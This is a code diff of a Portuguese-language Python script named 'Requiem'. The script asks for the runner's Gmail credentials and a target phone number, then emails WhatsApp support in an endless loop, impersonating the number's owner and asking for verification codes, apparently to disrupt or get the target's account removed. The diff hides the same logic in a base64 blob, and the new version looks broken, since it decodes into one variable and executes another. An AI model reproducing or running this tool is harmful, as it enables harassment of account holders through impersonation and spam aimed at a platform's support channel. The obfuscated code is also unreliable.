@@ -1,78 +1,12 @@
-global R,B,C,Y,G,RT,CY,CO
-CO='\033[m';R='\033[1;31m';B='\033[1;34m';C='\033[1;37m';CY='\033[1;36m';Y='\033[1;33m';G='\033[1;32m';RT='\033[;0m';NO_FORMAT="\033[0m";C_GREY89="\033[38;5;254m";C_RED1="\033[48;5;196m"
-import smtplib, os, sys, time, ssl
-def restart():
-    python = sys.executable;os.execl(python, python, *sys.argv)
-
-def clear():
-	os.system("clear")
-	
+import marshal, zlib, os, sys
+# sla se base64 vem pré-instalada, lmfao
+# Script Name: Requiem
+# https://docs.python.org/3.5/library/smtplib.html 
+# http://stackoverflow.com/a/27515833/2684304
 try:
-	import pyfiglet
+	import base64
 except:
-	os.system("pip install pyfiglet");restart()
-result = pyfiglet.figlet_format("R e q u i e m", font = "cosmic" );clear();print(f'''{C}{G}
-{result}
-...`
-                             .+ss+//oss:`
-                         `:oy+-       `:ss+.
-                      `/ss/`              -oyo-
-                   -+yo:                     `/ys/`
-               `:sy+.                           `:sy+.
-            `/ss/`                                  -+yo+
-           -h/                                         .ys`
-          `m-                                        -+ssdo
-          -d                                      :sdNNNNNd
-          :d                                  `/ymNNNNNNNNd
-          :d                               .+hNNNNNNNNNNNNd
-          :d                            -odNNNNNNNNNNNNNNNd
-          :d                         :sdNNNNNNNNNNNNNNNNNNd
-          :d                       +mNNNNNNNNNNNNNNNNNNNNNd
-          :d                      sNNNNNNNNNNNNNNNNNNNNNNNd
-          :d                      hNNNNNy`yyNNNNNNNNNNNNNNd
-          :d                      hNNNNh-.:sNNNNNNNNNNNNNNd
-          :d                      hNNNh`+NNNNNNNNNNNNNNNNNd
-          -d                      hNNNy  `./mNNNNNNNNNNNNNd
-          `m.                     hNNNNdyy- dNNNNNhmNNNNNNs
-           :d:                    hNNNNNmh./NNmy/-+mNNNNNy`
-            `+ys:`                hNNNh`` yNNNoodNNNNNmy:
-               `/yy/.             hNNNNmh/mNNNNNNNNdo-
-                  `:syo-          hNNNNNNNNNNNNNh+.
-                      .+ys:`      hNNNNNNNNNms/`
-                         `/sy+.   yNNNNNNdo-
-                             -oyo/+mNmy/.
-                                `-:::
-{C}\n{C}{G}Coded By:{C} Kiny\n{C}[{R}*{C}] Ative a permissão de baixa segurança e utilize um email por ataque(recomendação)\n{C}Modo: {G}Retirar do Contador{C}''')
-email = input(f'{C}[{Y}Gmail{C}]: ');senha = input(f'{C}[{Y}Senha (Não se preocupe, não temos acesso à sua senha){C}]: ');numero = input(f'{C}[{Y}Numero do Alvo (ex: 55 21 9********){C}]: ')
-if "+55 21 7918-0533" in numero:
-	exit()
-elif "+55 21 79180533" in numero:
-	exit()
-elif "55 21 7918053333" in numero:
-	exit()
-elif "55 21 7918-0533" in numero:
-	exit()
-elif "+55217918-0533" in numero:
-	exit()
-elif "+552179180533" in numero:
-	exit()
-elif "552179180533" in numero:
-	exit()
-elif "55217918-0533" in numero:
-	exit()
-print(f"{C}[{G}*{C}] RETIRANDO DO CONTADOR!\nUse {C}{R}CTRL C{C} para parar o script e para reiniciar {C}{G}python3 main.py{C}")
-while True:
-	try:
-		gmail_user = '{}'.format(email);gmail_password = '{}'.format(senha);sent_from = gmail_user;to = ['support@support.whatsapp.com'];subject = 'Reenviar codigo de verificacacao';body = 'Ola, nao consigo me registrar na minha conta, me ajudem: {}'.format(numero);email_text ="""\
-From: %s
-To: %s
-Subject: %s
-%s
-		""" % (sent_from, ", ".join(to), subject, body)
-		server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-		server.ehlo()
-		server.login(gmail_user, gmail_password)
-		server.sendmail(sent_from, to, email_text)
-		server.close()
-	except:
-		print(f"{C}[{R}ERROR{C}] Permissao nao garantida ou senha e email invalido(s).");time.sleep(5);os.system('python3 main.py')
+	os.system("pip install base64")
+	import base64
+a = (base64.b64decode('''Z2xvYmFsIFIsQixDLFksRyxSVCxDWSxDTwpDTz0nXDAzM1ttJztSPSdcMDMzWzE7MzFtJztCPSdcMDMzWzE7MzRtJztDPSdcMDMzWzE7MzdtJztDWT0nXDAzM1sxOzM2bSc7WT0nXDAzM1sxOzMzbSc7Rz0nXDAzM1sxOzMybSc7UlQ9J1wwMzNbOzBtJztOT19GT1JNQVQ9IlwwMzNbMG0iO0NfR1JFWTg5PSJcMDMzWzM4OzU7MjU0bSI7Q19SRUQxPSJcMDMzWzQ4OzU7MTk2bSIKaW1wb3J0IHNtdHBsaWIsIG9zLCBzeXMsIHRpbWUsIHNzbApkZWYgcmVzdGFydCgpOgogICAgcHl0aG9uID0gc3lzLmV4ZWN1dGFibGU7b3MuZXhlY2wocHl0aG9uLCBweXRob24sICpzeXMuYXJndikKCmRlZiBjbGVhcigpOgoJb3Muc3lzdGVtKCJjbGVhciIpCgkKdHJ5OgoJaW1wb3J0IHB5ZmlnbGV0CmV4Y2VwdDoKCW9zLnN5c3RlbSgicGlwIGluc3RhbGwgcHlmaWdsZXQiKTtyZXN0YXJ0KCkKcmVzdWx0ID0gcHlmaWdsZXQuZmlnbGV0X2Zvcm1hdCgiUiBlIHEgdSBpIGUgbSIsIGZvbnQgPSAiY29zbWljIiApO2NsZWFyKCk7cHJpbnQoZicnJ3tDfXtHfQp7cmVzdWx0fQouLi5gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLitzcysvL29zczpgCiAgICAgICAgICAgICAgICAgICAgICAgICBgOm95Ky0gICAgICAgYDpzcysuCiAgICAgICAgICAgICAgICAgICAgICBgL3NzL2AgICAgICAgICAgICAgIC1veW8tCiAgICAgICAgICAgICAgICAgICAtK3lvOiAgICAgICAgICAgICAgICAgICAgIGAveXMvYAogICAgICAgICAgICAgICBgOnN5Ky4gICAgICAgICAgICAgICAgICAgICAgICAgICBgOnN5Ky4KICAgICAgICAgICAgYC9zcy9gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0reW8rCiAgICAgICAgICAgLWgvICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAueXNgCiAgICAgICAgICBgbS0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLStzc2RvCiAgICAgICAgICAtZCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOnNkTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBgL3ltTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAuK2hOTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgICAgICAtb2ROTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgICA6c2ROTk5OTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICAgK21OTk5OTk5OTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICBzTk5OTk5OTk5OTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICBoTk5OTk55YHl5Tk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICBoTk5OTmgtLjpzTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICA6ZCAgICAgICAgICAgICAgICAgICAgICBoTk5OaGArTk5OTk5OTk5OTk5OTk5OTk5kCiAgICAgICAgICAtZCAgICAgICAgICAgICAgICAgICAgICBoTk5OeSAgYC4vbU5OTk5OTk5OTk5OTk5kCiAgICAgICAgICBgbS4gICAgICAgICAgICAgICAgICAgICBoTk5OTmR5eS0gZE5OTk5OaG1OTk5OTk5zCiAgICAgICAgICAgOmQ6ICAgICAgICAgICAgICAgICAgICBoTk5OTk5taC4vTk5teS8tK21OTk5OTnlgCiAgICAgICAgICAgIGAreXM6YCAgICAgICAgICAgICAgICBoTk5OaGBgIHlOTk5vb2ROTk5OTm15OgogICAgICAgICAgICAgICBgL3l5Ly4gICAgICAgICAgICAgaE5OTk5taC9tTk5OTk5OTk5kby0KICAgICAgICAgICAgICAgICAgYDpzeW8tICAgICAgICAgIGhOTk5OTk5OTk5OTk5OaCsuCiAgICAgICAgICAgICAgICAgICAgICAuK3lzOmAgICAgICBoTk5OTk5OTk5ObXMvYAogICAgICAgICAgICAgICAgICAgICAgICAgYC9zeSsuICAgeU5OTk5OTmRvLQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIC1veW8vK21ObXkvLgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGAtOjo6CntDfVxue0N9e0d9Q29kZWQgQnk6e0N9IEtpbnlcbntDfVt7Un0qe0N9XSBBdGl2ZSBhIHBlcm1pc3PDo28gZGUgYmFpeGEgc2VndXJhbsOnYSBlIHV0aWxpemUgdW0gZW1haWwgcG9yIGF0YXF1ZShyZWNvbWVuZGHDp8OjbylcbntDfU1vZG86IHtHfVJldGlyYXIgZG8gQ29udGFkb3J7Q30nJycpCmVtYWlsID0gaW5wdXQoZid7Q31be1l9R21haWx7Q31dOiAnKTtzZW5oYSA9IGlucHV0KGYne0N9W3tZfVNlbmhhIChOw6NvIHNlIHByZW9jdXBlLCBuw6NvIHRlbW9zIGFjZXNzbyDDoCBzdWEgc2VuaGEpe0N9XTogJyk7bnVtZXJvID0gaW5wdXQoZid7Q31be1l9TnVtZXJvIGRvIEFsdm8gKGV4OiA1NSAyMSA5KioqKioqKiope0N9XTogJykKaWYgIis1NSAyMSA3OTE4LTA1MzMiIGluIG51bWVybzoKCWV4aXQoKQplbGlmICIrNTUgMjEgNzkxODA1MzMiIGluIG51bWVybzoKCWV4aXQoKQplbGlmICI1NSAyMSA3OTE4MDUzMzMzIiBpbiBudW1lcm86CglleGl0KCkKZWxpZiAiNTUgMjEgNzkxOC0wNTMzIiBpbiBudW1lcm86CglleGl0KCkKZWxpZiAiKzU1MjE3OTE4LTA1MzMiIGluIG51bWVybzoKCWV4aXQoKQplbGlmICIrNTUyMTc5MTgwNTMzIiBpbiBudW1lcm86CglleGl0KCkKZWxpZiAiNTUyMTc5MTgwNTMzIiBpbiBudW1lcm86CglleGl0KCkKZWxpZiAiNTUyMTc5MTgtMDUzMyIgaW4gbnVtZXJvOgoJZXhpdCgpCnByaW50KGYie0N9W3tHfSp7Q31dIFJFVElSQU5ETyBETyBDT05UQURPUiFcblVzZSB7Q317Un1DVFJMIEN7Q30gcGFyYSBwYXJhciBvIHNjcmlwdCBlIHBhcmEgcmVpbmljaWFyIHtDfXtHfXB5dGhvbjMgbWFpbi5weXtDfSIpCndoaWxlIFRydWU6Cgl0cnk6CgkJZ21haWxfdXNlciA9ICd7fScuZm9ybWF0KGVtYWlsKTtnbWFpbF9wYXNzd29yZCA9ICd7fScuZm9ybWF0KHNlbmhhKTtzZW50X2Zyb20gPSBnbWFpbF91c2VyO3RvID0gWydzdXBwb3J0QHN1cHBvcnQud2hhdHNhcHAuY29tJ107c3ViamVjdCA9ICdSZWVudmlhciBjb2RpZ28gZGUgdmVyaWZpY2FjYWNhbyc7Ym9keSA9ICdPbGEsIG5hbyBjb25zaWdvIG1lIHJlZ2lzdHJhciBuYSBtaW5oYSBjb250YSwgbWUgYWp1ZGVtOiB7fScuZm9ybWF0KG51bWVybyk7ZW1haWxfdGV4dCA9IiIiXApGcm9tOiAlcwpUbzogJXMKU3ViamVjdDogJXMKJXMKCQkiIiIgJSAoc2VudF9mcm9tLCAiLCAiLmpvaW4odG8pLCBzdWJqZWN0LCBib2R5KQoJCXNlcnZlciA9IHNtdHBsaWIuU01UUF9TU0woJ3NtdHAuZ21haWwuY29tJywgNDY1KQoJCXNlcnZlci5laGxvKCkKCQlzZXJ2ZXIubG9naW4oZ21haWxfdXNlciwgZ21haWxfcGFzc3dvcmQpCgkJc2VydmVyLnNlbmRtYWlsKHNlbnRfZnJvbSwgdG8sIGVtYWlsX3RleHQpCgkJc2VydmVyLmNsb3NlKCkKCWV4Y2VwdDoKCQlwcmludChmIntDfVt7Un1FUlJPUntDfV0gUGVybWlzc2FvIG5hbyBnYXJhbnRpZGEgb3Ugc2VuaGEgZSBlbWFpbCBpbnZhbGlkbyhzKS4iKTt0aW1lLnNsZWVwKDUpO29zLnN5c3RlbSgncHl0aG9uMyBtYWluLnB5JykK'''))
+exec(b)
